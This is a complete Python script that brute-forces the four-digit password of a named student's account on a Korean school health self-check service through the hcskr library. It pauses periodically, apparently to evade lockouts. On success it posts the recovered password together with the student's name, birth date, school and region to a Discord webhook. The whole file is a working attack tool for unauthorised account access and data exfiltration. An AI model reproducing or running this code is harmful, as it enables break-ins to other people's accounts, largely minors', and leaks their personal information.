import hcskr
import time
from discord_webhook import DiscordWebhook


for num in range(0, 10000):
    ######

    name = "유저 이름"
    birth = "생년월일 6자리"
    level = "학교급 / 유형"
    region = "지역"
    school = "학교이름"
    customloginname = "FOUND"
    Discord_webhook = "webhook url"

    ######

    print("%04d" %num)
    password = "%04d" %num

    def msg():
        print("Done")
        webhook = DiscordWebhook(url=Discord_webhook, content =\
            "**`> " + name + " 님 " + data['message'] + "`**\n"\
            "```cs\n"\
            "[+] 이름 : " + name + \
            "\n[+] 생년월일 : " + birth + \
            "\n[+] 학교급 : " + level + \
            "\n[+] 지역 : " + region + \
            "\n[+] 학교이름 : " + school + \
            "\n[+] 로그인 닉네임 : " + customloginname + \
            "\n\n[+] 비밀번호 : " + password + \
            "\n```", username = "Password_Finder", avatar_url = "")
        webhook.execute()
        print("webhook sent")

    if num % 5 == 0:
        time.sleep(303)
        data = hcskr.selfcheck(name,birth,region,school,level,password,customloginname)
        print("> " + name + "님 " + data['message'])
        if data['message'] == "성공적으로 자가진단을 수행하였습니다.":
            msg()
            break
        else:
            pass
        
    else:
        data = hcskr.selfcheck(name,birth,region,school,level,password,customloginname)
        print("> " + name + "님 " + data['message'])
        if data['message'] == "성공적으로 자가진단을 수행하였습니다.":
            msg()
            break
        else:
            pass